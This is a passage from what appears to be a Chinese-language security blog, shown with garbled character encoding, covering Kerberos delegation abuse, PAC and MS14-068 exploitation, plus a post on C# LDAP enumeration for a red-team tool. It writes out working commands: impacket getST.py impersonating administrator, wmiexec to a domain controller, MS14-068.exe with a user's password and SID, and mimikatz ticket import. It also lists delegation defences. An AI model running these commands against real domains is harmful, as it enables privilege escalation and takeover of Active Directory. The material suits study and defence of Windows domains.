<p><img src="https://i.bmp.ovh/imgs/2021/10/6dacfd8c0def0e6e.png"></p>
<p>å¯ä»¥çœ‹åˆ°testè´¦æˆ·å…·æœ‰å§”æ´¾æ€§</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/8222261fd19b023e.png"></p>
<p>ç„¶ååœ¨kaliä¸Šæ”»å‡»</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.200.146 -spn krbtgt/0day.org -impersonate administrator 0day.org/test:Yicunyiye123</span><br></pre></td></tr></table></figure>



<p><img src="https://i.bmp.ovh/imgs/2021/10/136c713f90558177.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 wmiexec.py -no-pass -k administrator@OWA2010SP3 -dc-ip 192.168.200.146</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/4675dd9fc71fcfc7.png"></p>
<h2 id="åŸŸå§”æ´¾çš„é˜²å¾¡æªæ–½"><a href="#åŸŸå§”æ´¾çš„é˜²å¾¡æªæ–½" class="headerlink" title="åŸŸå§”æ´¾çš„é˜²å¾¡æªæ–½"></a>åŸŸå§”æ´¾çš„é˜²å¾¡æªæ–½</h2><p>å› ä¸ºå§”æ´¾æ¯”è¾ƒå®ç”¨æˆ‘ä»¬ä¹Ÿä¸èƒ½è¯´ç›´æ¥ç®€å•ç²—æš´å…³é—­è¯¥åŠŸèƒ½ã€‚</p>
<p>1.é«˜æƒé™ç”¨æˆ·å¯ä»¥è®¾ç½®ä¸èƒ½è¢«å§”æ´¾</p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/ac6bfda4d4ba45f1.png"></p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/6fcd4c0c5cdc6ae5.png"></p>
<p>å¯ä»¥çœ‹åˆ°administratoræ˜¯æ— æ³•æˆåŠŸçš„ï¼Œä½†æ˜¯sqladminå¯ä»¥</p>
<p>2.Windows 2012 R2åŠæ›´é«˜çš„ç³»ç»Ÿå»ºç«‹äº†å—ä¿æŠ¤çš„ç”¨æˆ·ç»„ï¼Œç»„å†…ç”¨æˆ·ä¸å…è®¸è¢«å§”æ´¾ï¼Œè¿™æ˜¯æœ‰æ•ˆçš„æ‰‹æ®µã€‚å—ä¿æŠ¤çš„ç”¨æˆ·ç»„ï¼Œå½“è¿™ä¸ªç»„å†…çš„ç”¨æˆ·ç™»å½•æ—¶ï¼ˆwindows 2012 R2åŸŸæœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯å¿…é¡»ä¸ºWindows 8.1æˆ–ä¹‹ä¸Šï¼‰ï¼Œä¸èƒ½ä½¿ç”¨NTLMè®¤è¯ï¼›é€‚ç”¨äº<code>Windows Server 2016</code>ï¼Œ<code>Windows Server 2012 R2</code>ã€ <code>Windows Server 2012</code></p>
<p>3.ä¸€èˆ¬TGT 4å°æ—¶åå¤±æ•ˆ</p>
<p>4.Kerberosé¢„è®¤è¯æ—¶ä¸ä½¿ç”¨DESæˆ–è€…RC4ç­‰åŠ å¯†ç®—æ³•ï¼›</p>
<h1 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h1><p>å…·ä½“æŸ¥çœ‹ï¼š<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/192810#h2-1">Windowså†…ç½‘åè®®å­¦ä¹ Kerberosç¯‡ä¹‹PAC</a></p>
<p>kerberosçš„æµç¨‹ï¼š</p>
<p>1.ç”¨æˆ·å‘KDCå‘èµ·AS_REQ,è¯·æ±‚å‡­æ®æ˜¯ç”¨æˆ·hashåŠ å¯†çš„æ—¶é—´æˆ³ï¼ŒKDCä½¿ç”¨ç”¨æˆ·hashè¿›è¡Œè§£å¯†ï¼Œå¦‚æœç»“æœæ­£ç¡®è¿”å›ç”¨krbtgt hashåŠ å¯†çš„TGTç¥¨æ®</p>
<p>2.ç”¨æˆ·å‡­å€ŸTGTç¥¨æ®å‘KDCå‘èµ·é’ˆå¯¹ç‰¹å®šæœåŠ¡çš„TGS_REQè¯·æ±‚ï¼ŒKDCä½¿ç”¨krbtgt hashè¿›è¡Œè§£å¯†ï¼Œå¦‚æœç»“æœæ­£ç¡®ï¼Œå°±è¿”å›ç”¨æœåŠ¡hash åŠ å¯†çš„TGSç¥¨æ®</p>
<p>3.ç”¨æˆ·æ‹¿ç€TGSç¥¨æ®å»è¯·æ±‚æœåŠ¡ï¼ŒæœåŠ¡ä½¿ç”¨è‡ªå·±çš„hashè§£å¯†TGSç¥¨æ®ã€‚å¦‚æœè§£å¯†æ­£ç¡®ï¼Œå°±å…è®¸ç”¨æˆ·è®¿é—®ã€‚</p>
<p>ä¸Šé¢è¿™ä¸ªæµç¨‹çœ‹èµ·æ¥æ²¡é”™ï¼Œå´å¿½ç•¥ä¸€ä¸ªæœ€é‡è¦çš„å› ç´ ï¼Œé‚£å°±æ˜¯ç”¨æˆ·æœ‰æ²¡æœ‰æƒé™è®¿é—®è¯¥æœåŠ¡ï¼Œåœ¨ä¸Šé¢çš„æµç¨‹é‡Œé¢ï¼Œåªè¦ç”¨æˆ·çš„hashæ­£ç¡®ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‹¿åˆ°TGTï¼Œæœ‰äº†TGTï¼Œå°±å¯ä»¥æ‹¿åˆ°TGSï¼Œæœ‰äº†TGSï¼Œå°±å¯ä»¥è®¿é—®æœåŠ¡ï¼Œä»»ä½•ä¸€ä¸ªç”¨æˆ·éƒ½å¯ä»¥è®¿é—®ä»»ä½•æœåŠ¡ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸Šé¢çš„æµç¨‹è§£å†³äº†â€Who am i?â€çš„é—®é¢˜ï¼Œå¹¶æ²¡æœ‰è§£å†³ â€œWhat can I do?â€çš„é—®é¢˜ã€‚</p>
<p>åœ¨Kerberosæœ€åˆè®¾è®¡çš„æµç¨‹é‡Œè¯´æ˜äº†å¦‚ä½•è¯æ˜å®¢æˆ·ç«¯çš„çœŸå®èº«ä»½ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è¯´æ˜å®¢æˆ·ç«¯æ˜¯å¦æœ‰æƒé™è®¿é—®è¯¥æœåŠ¡ï¼Œå› ä¸ºåœ¨åŸŸä¸­ä¸åŒæƒé™çš„ç”¨æˆ·èƒ½å¤Ÿè®¿é—®çš„èµ„æºæ˜¯ä¸åŒçš„ã€‚æ‰€ä»¥å¾®è½¯ä¸ºäº†è§£å†³æƒé™è¿™ä¸ªé—®é¢˜ï¼Œå¼•å…¥äº† PAC (Privilege Attribute Certificateï¼Œç‰¹æƒå±æ€§è¯ä¹¦) çš„æ¦‚å¿µã€‚</p>
<h2 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h2><p>MS14-068ç¼–å·CVE-2014-6324ï¼Œè¡¥ä¸ä¸º3011780ï¼Œå¦‚æœè‡ªæ£€å¯åœ¨åŸŸæ§åˆ¶å™¨ä¸Šä½¿ç”¨å‘½ä»¤æ£€æµ‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo |find &quot;3011780&quot;</span><br></pre></td></tr></table></figure>

<p>ä¸ºç©ºè¯´æ˜è¯¥æœåŠ¡å™¨å­˜åœ¨MS14-068æ¼æ´</p>
<p>ç¯å¢ƒï¼š</p>
<p>åŸŸæœºå™¨ï¼šPC-JACK-0DAYï¼Œwin7ï¼ŒçŸ¥é“ä¸€ä¸ªåŸŸç”¨æˆ·å’Œå¯†ç ï¼šjack\0dayï¼Œadmin!@#45ï¼Œæ‹¥æœ‰è¯¥æœºå™¨çš„ç®¡ç†å‘˜æƒé™</p>
<p>åŸŸæ§ï¼šOWA2010SP3ï¼Œip:192.168.3.142</p>
<p><strong>1.ç”Ÿæˆç¥¨æ®</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u jack@0day.org -p admin!@#45 -s S-1-5-21-1812960810-2335050734-3517558805-1133 -d 192.168.3.142  </span><br><span class="line">#MS14-068.exe -u åŸŸç”¨æˆ·@0day.org -p åŸŸç”¨æˆ·jackå¯†ç  -s åŸŸç”¨æˆ·jackçš„SID -d åŸŸæ§ip</span><br></pre></td></tr></table></figure>



<p><img src="https://i.bmp.ovh/imgs/2021/10/b7b9d716c74d6bda.png"></p>
<p>å¯ä»¥çœ‹åˆ°ç”Ÿæˆäº†<a href="mailto:&#84;&#71;&#84;&#95;&#106;&#x61;&#99;&#107;&#x40;&#x30;&#100;&#97;&#121;&#x2e;&#x6f;&#114;&#x67;&#x2e;&#99;&#x63;&#x61;&#99;&#104;&#101;">&#84;&#71;&#84;&#95;&#106;&#x61;&#99;&#107;&#x40;&#x30;&#100;&#97;&#121;&#x2e;&#x6f;&#114;&#x67;&#x2e;&#99;&#x63;&#x61;&#99;&#104;&#101;</a></p>
<p><strong>2.mimikatzå¯¼å…¥ç¥¨æ®</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc ç¥¨æ®è·¯å¾„</span><br></pre></td></tr></table></figure>

<p><img src="https://i.bmp.ovh/imgs/2021/10/c80cbb20e7d7478d.png"></p>
<p><strong>3.è®¿é—®åŸŸæ§</strong></p>
<p><img src="https://i.bmp.ovh/imgs/2021/10/861831303e5a0909.png"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/02/csharp%E6%93%8D%E4%BD%9Cldap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/47177122?v=4">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="æˆ‘æ˜¯GGè¿˜æ˜¯MM">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/10/02/csharp%E6%93%8D%E4%BD%9Cldap/" itemprop="url">c#æ“ä½œldap</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2021-10-02T19:59:30+08:00">
                2021-10-02
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>é¡¹ç›®åœ°å€ï¼š<a target="_blank" rel="noopener" href="https://github.com/yicunyiye/FuckLdap">https://github.com/yicunyiye/FuckLdap</a></p>
<h1 id="0x01-Ldapè¿æ¥"><a href="#0x01-Ldapè¿æ¥" class="headerlink" title="0x01 Ldapè¿æ¥"></a>0x01 Ldapè¿æ¥</h1><p>æˆ‘ä»¬å¸¸è§„çš„ldapæŸ¥è¯¢ä¾‹å¦‚ldapsearch</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot;</span><br></pre></td></tr></table></figure>

<p>ldapè¿æ¥åœ°å€ä¸ºï¼šldap://192.168.11.16<br>ç”¨æˆ·ä¸ºhack<br>å¯†ç ä¸ºtest123..<br>â€‹</p>
<p>åœ¨åŸŸå¤–æˆ‘ä»¬éœ€è¦æŒ‡å®šipåœ°å€ï¼Œåœ¨åŸŸå†…æˆ‘ä»¬åªéœ€è¦æŒ‡å®šåŸŸåä¹Ÿè¡Œï¼Œä¾‹å¦‚æµ‹è¯•ç¯å¢ƒçš„redteamï¼Œä¹Ÿå°±æ˜¯ldap://redteam,è¿™é‡Œå°±è¯´æ˜æˆ‘ä»¬å†™ä»£ç çš„æ—¶å€™å°±éœ€è¦è€ƒè™‘æ˜¯åœ¨åŸŸå†…è¿˜æ˜¯åœ¨åŸŸå¤–ã€‚<br>â€‹</p>
<p>åœ¨c#è¿›è¡Œldapè¿æ¥çš„æ—¶å€™éœ€è¦å¼•å…¥DirectoryServices.dllï¼Œè¿™ä¸ªæ˜¯ç³»ç»Ÿè‡ªå¸¦çš„ï¼Œè‡ªè¡Œå¯»æ‰¾ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">using System.DirectoryServices</span><br></pre></td></tr></table></figure>


<p><img src="https://cdn.jsdelivr.net/gh/filess/img16@main/2021/10/01/1633088382782-d3a0a9b9-15de-489a-bc32-46606b902e64.png"></p>
<h2 id="1-1åŸŸå¤–è¿æ¥"><a href="#1-1åŸŸå¤–è¿æ¥" class="headerlink" title="1.1åŸŸå¤–è¿æ¥"></a>1.1åŸŸå¤–è¿æ¥</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string url = &quot;LDAP://192.168.11.16/&quot;;</span><br><span class="line">string username = &quot;hack&quot;;</span><br><span class="line">string password = &quot;test123..&quot;;</span><br><span class="line">DirectoryEntry coon = new DirectoryEntry(url,username, password);</span><br></pre></td></tr></table></figure>


<p>DirectoryEntryç±»å¯å°è£… Active Directory åŸŸæœåŠ¡å±‚æ¬¡ç»“æ„ä¸­çš„èŠ‚ç‚¹æˆ–å¯¹è±¡ã€‚<br>â€‹</p>
<h2 id="1-2-åŸŸå†…è¿æ¥"><a href="#1-2-åŸŸå†…è¿æ¥" class="headerlink" title="1.2 åŸŸå†…è¿æ¥"></a>1.2 åŸŸå†…è¿æ¥</h2><p>å¦‚æœæ˜¯åœ¨åŸŸå†…ï¼Œæˆ‘ä»¬ç›´æ¥å¯ä»¥ä½¿ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DirectoryEntry coon = new DirectoryEntry();</span><br></pre></td></tr></table></figure>


<p>æ‰€ä»¥æˆ‘ä»¬å°±è¦åˆ¤æ–­ä¸‹ä¸¤ç§æƒ…å†µã€‚æˆ‘ä»¬çŸ¥é“äº†è¦ç”¨coonæ¥è·å–èŠ‚ç‚¹åˆ—è¡¨ï¼Œç”¨searchæ¥è¿›è¡Œæ¡ä»¶æŸ¥è¯¢ã€‚æˆ‘ä»¬å¯ä»¥å†™ä¸¤ä¸ªæ–¹æ³•æ¥è¿›è¡Œè·å–ï¼š<br>â€‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//åŸŸå†…</span><br><span class="line">public static DirectoryEntry Get_coon_nopass()</span><br><span class="line">&#123;</span><br><span class="line">    coon = new DirectoryEntry();</span><br><span class="line">    return coon;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static DirectorySearcher Get_search_nopass()</span><br><span class="line">&#123;</span><br><span class="line">    search = new DirectorySearcher(coon);</span><br><span class="line">    return search;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//åŸŸå¤–</span><br><span class="line">public static void SET_LDAP_USER_PASS()</span><br><span class="line">&#123;</span><br><span class="line">    url = &quot;LDAP://&quot; + GetArgsValue.domain;</span><br><span class="line">    username = GetArgsValue.user;</span><br><span class="line">    password = GetArgsValue.pass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static DirectoryEntry Get_coon()</span><br><span class="line">&#123;</span><br><span class="line">    coon = new DirectoryEntry(url, username, password);</span><br><span class="line">    return coon;</span><br><span class="line">&#125;</span><br><span class="line">public static DirectorySearcher Get_search()</span><br><span class="line">&#123;</span><br><span class="line">    search = new DirectorySearcher(coon);</span><br><span class="line">    return search;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>åŸŸå†…å¾ˆå¥½ç†è§£ï¼Œè¿™é‡Œæ¥è¯´ä¸‹åŸŸå¤–ã€‚<br>SET_LDAP_USER_PASS()è¿™ä¸ªæ–¹æ³•ç”¨æ¥è·å–urlï¼Œusernameï¼Œpasswordï¼Œç„¶åè°ƒç”¨äº†GetArgsValueç±»é‡Œé¢çš„å±æ€§ã€‚<br>â€‹</p>
<p>è¿™é‡Œæˆ‘ç”¨äº†NDesk.Optionsæ¥å¤„ç†è·å–çš„å‚æ•°ã€‚<br>â€‹</p>
<p>å…ˆå®šä¹‰ä¸‰ä¸ªlist<string></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;string&gt; domains = new List&lt;string&gt;();</span><br><span class="line">List&lt;string&gt; users = new List&lt;string&gt;();</span><br><span class="line">List&lt;string&gt; passes = new List&lt;string&gt;();</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;t|target=&quot;, &quot;the &#123;Target&#125; of the needed to add user&quot;,v =&gt; adduser.Add (v) &#125;,</span><br><span class="line">&#123; &quot;d|domain=&quot;, &quot;the &#123;IP&#125; of the target&quot;,v =&gt; domains.Add (v) &#125;,</span><br><span class="line">&#123; &quot;u|user=&quot;, &quot;the &#123;user&#125; of the target&quot;,v =&gt; users.Add (v) &#125;,</span><br></pre></td></tr></table></figure>


<p>è¿™é‡Œçš„æ„æ€å°±æ˜¯å½“ç”¨æˆ·è¾“å…¥-t -d -u åé¢æ¥å—çš„å€¼åˆ†åˆ«ä¼ é€’ç»™äº†domains,users,passesã€‚<br>â€‹</p>
<p>ç„¶åå†™äº†ä¸ªGetArgsValueç±»æ¥å­˜å‚¨è¿™äº›å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    public static string domain = &quot;&quot;;</span><br><span class="line">    public static string user = &quot;&quot;;</span><br><span class="line">    public static string pass = &quot;&quot;;</span><br><span class="line">public static void GetDomainValue(List&lt;string&gt; param1 = null)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach (string p in param1)</span><br><span class="line">        &#123;</span><br><span class="line">            domain = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void GetUserValue(List&lt;string&gt; param2 = null)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach (string p in param2)</span><br><span class="line">        &#123;</span><br><span class="line">            user = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void GetPassValue(List&lt;string&gt; param3 = null)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach (string p in param3)</span><br><span class="line">        &#123;</span><br><span class="line">            pass = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨ä¸»å‡½æ•°è°ƒç”¨äº†ä¸€ä¸‹æ–¹æ³•ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//domain ip</span><br><span class="line">GetArgsValue.GetDomainValue(domains);</span><br><span class="line">//domain user</span><br><span class="line">GetArgsValue.GetUserValue(users);</span><br><span class="line">//domain pass</span><br><span class="line">GetArgsValue.GetPassValue(passes);</span><br></pre></td></tr></table></figure>


<p>é‚£ä¹ˆå½“ç”¨æˆ·è¾“å…¥çš„å€¼å°±ä¼šå­˜å‚¨åœ¨GetArgsValueç±»é‡Œé¢çš„3ä¸ªå­—æ®µé‡Œã€‚ç°åœ¨çœ‹åˆ°ä¸€ä¸‹å°±å¾ˆå¥½ç†è§£äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;LDAP://&quot; + GetArgsValue.domain;</span><br><span class="line">username = GetArgsValue.user;</span><br><span class="line">password = GetArgsValue.pass;</span><br></pre></td></tr></table></figure>


<p>åŸŸå†…å¤–è¿æ¥éƒ½å†™äº†ï¼Œç„¶åå°±è¦å†™ä¸€ä¸ªæ–¹æ³•æ¥æ¥å—æˆ‘ä»¬çš„è¿æ¥ã€‚<br>â€‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public static void LDAP_COON()</span><br><span class="line">&#123;</span><br><span class="line">    if(GetArgsValue.user == &quot;&quot; &amp;&amp; GetArgsValue.pass == &quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            coon = Get_coon_nopass();</span><br><span class="line">            search = Get_search_nopass();</span><br><span class="line">        &#125;</span><br><span class="line">        catch</span><br><span class="line">        &#123;</span><br><span class="line">            Font.Warning();</span><br><span class="line">            Console.WriteLine(&quot;connection ldap fail&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else if(GetArgsValue.user != &quot;&quot; &amp;&amp; GetArgsValue.pass != &quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            SET_LDAP_USER_PASS();</span><br><span class="line">            coon = Get_coon();</span><br><span class="line">            search = Get_search();</span><br><span class="line">        &#125;</span><br><span class="line">        catch</span><br><span class="line">        &#123;</span><br><span class="line">            Font.Warning();</span><br><span class="line">            Console.WriteLine(&quot;connection ldap fail&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>è¿™é‡Œæˆ‘çš„æ–¹æ³•å°±æ˜¯å½“GetArgsValue.userå’ŒGetArgsValue.passçš„å€¼ä¸ºç©ºçš„æ—¶å€™å°±ä¼šæ‰§è¡ŒåŸŸå†…è¿æ¥æ–¹æ³•ï¼Œå¦åˆ™å°±ä¸ºåŸŸå¤–ã€‚<br>â€‹</p>
<p>æˆ‘ä»¬æŠŠè¿™ä¸ªè¿æ¥æ–¹æ³•å°è£…åˆ°Ldapcoonç±»é‡Œé¢ï¼Œæ–¹ä¾¿åé¢çš„è°ƒç”¨</p>
<p>å½“åœ¨åŸŸå¤–è¾“å…¥ä»¥ä¸‹å°±ä¼šè¿æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx.exe -d 192.168.11.16 -u hack -p test123..</span><br></pre></td></tr></table></figure>




<h1 id="0x02-Filteræœç´¢æ¡ä»¶"><a href="#0x02-Filteræœç´¢æ¡ä»¶" class="headerlink" title="0x02 Filteræœç´¢æ¡ä»¶"></a>0x02 Filteræœç´¢æ¡ä»¶</h1><p>è¿™é‡Œåªä¼šè®²ä¸€äº›æˆ‘ä»¬éœ€è¦ç”¨åˆ°çš„ä¸€äº›è¯­æ³•ï¼Œå…¶ä»–è¯­æ³•å¦‚æœæ„Ÿå…´è¶£å¯ä»¥è‡ªè¡Œæœç´¢ä¸‹ã€‚<br>â€‹</p>
<p>è¿™é‡Œå…ˆä¸¾ä¾‹è·å–åŸŸå†…ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass=user)(objectCategory=person))</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/filess/img14@main/2021/10/01/1633088403409-a17bedc5-51c2-4167-b886-ed174fbb3efc.png"></p>
<p>åœ¨c#ä¸­DirectorySearcherç±»çš„ä½œç”¨æ˜¯å¯¹ Active Directory åŸŸæœåŠ¡æ‰§è¡ŒæŸ¥è¯¢<br>â€‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public DirectorySearcher (System.DirectoryServices.DirectoryEntry searchRoot);</span><br><span class="line"></span><br><span class="line">searchRoot</span><br><span class="line">DirectoryEntry</span><br><span class="line">Active Directory åŸŸæœåŠ¡å±‚æ¬¡ç»“æ„ä¸­çš„èŠ‚ç‚¹ï¼Œä»è¯¥èŠ‚ç‚¹å¤„å¼€å§‹æœç´¢ã€‚ SearchRoot å±æ€§åˆå§‹åŒ–ä¸ºè¯¥å€¼ã€‚</span><br></pre></td></tr></table></figure>


<p>è®¾ç½®filterä¸ºæŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DirectorySearcher search = new DirectorySearcher(coon);</span><br><span class="line">search.Filter = &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;;</span><br><span class="line">foreach (SearchResult r in search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string users = &quot;&quot;;</span><br><span class="line">                try</span><br><span class="line">                &#123;</span><br><span class="line">                    users = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">                    Console.WriteLine(users);</span><br><span class="line">                &#125;</span><br><span class="line">                catch</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(&quot;error&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>


<p>è¿™é‡Œnameå€¼å¦‚ä½•è€Œæ¥ï¼Œæˆ‘å…¶å®æ˜¯è¿™æ ·çœ‹çš„ï¼š<br>æˆ‘ä»¬å…ˆç”¨ldapsearchæ‰§è¡Œè¯¥è¯­å¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;</span><br></pre></td></tr></table></figure>


<p><img src="https://cdn.jsdelivr.net/gh/filess/img1@main/2021/10/01/1633088414936-2b98ffe1-f2ae-43bd-9d52-fb402991021b.png"></p>
<p>ä»£ç ï¼š</p>
